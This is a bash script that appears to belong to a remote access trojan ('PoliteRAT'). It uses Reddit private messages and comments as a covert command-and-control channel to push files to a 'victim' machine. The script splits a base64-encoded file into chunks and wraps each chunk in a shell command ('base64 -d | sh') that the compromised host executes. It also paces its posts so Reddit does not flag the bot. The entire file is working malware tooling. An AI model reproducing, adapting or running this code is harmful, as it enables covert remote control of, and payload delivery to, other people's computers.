#!/bin/bash
# ./reddit_transfer <file> <username>
# For sone reason, this does not work with the lcurl version of PoliteRAT. Honestly, this is indicative of unrelated bugs.
# One known issue is with the Regex library, which gets nervous <ie. crashes> when you make a huge match. This allows transfers
# of only 4,500 Bytes (packaged, out of a possible 10,000 within Reddit) with the legacy PoliteRAT, but does not work at all
# with the lcurl version. So no idea.

function reddit_login { #(string username, string password, string id, string secret)
	get_access_token=`curl -s -X POST -d "grant_type=password&username=$1&password=$2" --user "$3:$4" -A "Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36" https://www.reddit.com/api/v1/access_token 2>&1`
	access_token=`echo "$get_access_token" | cut -d"\"" -f4`
	echo "$access_token"
}

function reddit_curl { #(string method, string access_token, string data, string curl_api)
	user_agent="Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36"
	curl_data=""
	curl_user_agent="-A \'$user_agent\'"
	echo "curl -s -X $1 -H \"Authorization: bearer $2\" -d \"$3\" -A \"$user_agent\" https://oauth.reddit.com$4"
	curl -s -X $1 -H "Authorization: bearer $2" -d "$3" -A "$user_agent" https://oauth.reddit.com$4
}

function check_new_message { #(string access_token)
	get_message=`reddit_curl GET $1 "" /message/unread`
	message=`echo $get_message | grep -Po '"dist": (\d)' | awk '{ print $2 }'`
	body=`echo $get_message | grep -Po '"body": "([\s\S]+)", "dest":' | cut -d'"' -f 4`
	if [ $message == "1" ]; then
		thing_id=`echo "$get_message" | grep -Po '"name": "([^"]*)"' | cut -d\" -f 4`
		echo "$thing_id"
	elif [ $message == "" ]; then
		echo "get_new_token"
	else
		echo "$message"
	fi
}

cd /tmp
username="<user>"					#Edit to add your Reddit Username
password="<password>"					#Edit to add your Reddit Password
id="<id>"						#Reddit app ID (create a reddit app <https://reddit.com/prefs/apps>)
secret="<secret>"					#Reddit app Secret
count=0
file=$1
echo "[+] Logging in."
access_token=`reddit_login $username $password $id $secret`	#Logs into reddit to get an access_token
#10,000 characters is the reddit limit, though the victim limit appears to be much smaller
rm -fr /tmp/x*
base64 -w 0 $file > file.b64
split -b 4500 file.b64					#4,500 for legacy. lcurl does not work at all - no idea why
echo "[+] Initializing file transfer."
void=`reddit_curl POST $access_token "to=$2&subject=file_transfer&text=echo recv$count" /api/compose`	#first composition
echo "[+] Message 0 sent."
void=`reddit_curl POST $access_token "" /api/read_all_messages`						#marks all messages as read. Necessary.
total=$(x=0;for i in $(ls /tmp/x*); do x=$(($x + 1)); done; echo $x)
for split_section in $(ls /tmp/x*); do
	while [ 1 ]; do
		sleep 20				#sleeps long enough to work without fearing reddit will kill the bot.
		get_message=`reddit_curl GET $access_token "" /message/unread`
		message=`echo $get_message | grep -Po '"dist": (\d)' | awk '{ print $2 }'`
		body=`echo $get_message | grep -Po '"body": "([\s\S]+)", "dest":' | cut -d'"' -f 4`
		if [ "$message" = "1" ]; then
			thing_id=`echo "$get_message" | grep -Po '"name": "([^"]*)"' | cut -d\" -f 4`
			if [ "$body" = "recv$count" ]; then
				echo "[+] Message $count received."
				embedded=`echo "echo $(cat $split_section) >> /tmp/file;echo recv$(($count + 1))" | base64 -w 0`
				command="echo \"$embedded\" | sed 's/ /\x2B/g' | base64 -d | sh"	#Just as sloppy as it looks but it works
				data="thing_id=$thing_id&text=$command"
				void=`reddit_curl POST $access_token "$data" /api/comment`
				count=$(($count + 1))
				void=`reddit_curl POST $access_token "" /api/read_all_messages`
				echo "[+] Message $count of $total sent."
				break
			else
				void=`reddit_curl POST $access_token "" /api/read_all_messages`
				echo "[-] Unknown message received, marking as read."
			fi
		elif [ "$message" = "" ]; then		#When the token expires, the message field should return empty. Probably a bug in waiting
			echo "[-] Access token expired, requesting new one."
			access_token=`reddit_login $username $password $id $secret`
		else
			echo "[-] Message $count not yet received, sleeping."
		fi
	done
done
while [ 1 ]; do		#Final Check because I apparently don't know how to do a for loop +1. This code is probably redundant. More functions?
	sleep 20
	get_message=`reddit_curl GET $access_token "" /message/unread`
	message=`echo $get_message | grep -Po '"dist": (\d)' | awk '{ print $2 }'`
	body=`echo $get_message | grep -Po '"body": "([\s\S]+)", "dest":' | cut -d'"' -f 4`
	if [ "$message" = "1" ]; then
		thing_id=`echo "$get_message" | grep -Po '"name": "([^"]*)"' | cut -d\" -f 4`
		if [ "$body" = "recv$count" ]; then
			echo "[+] Message $count received."
			echo "[+] Done!"
			break
		else
			void=`reddit_curl POST $access_token "" /api/read_all_messages`
			echo "[-] Unknown message received, marking as read."
		fi
	elif [ "$message" = "" ]; then
		echo "[-] Access token expired, requesting new one."
		access_token=`reddit_login $username $password $id $secret`
	else
		echo "[-] Message $count not yet received, sleeping."
	fi
done
echo "[!] Exiting"
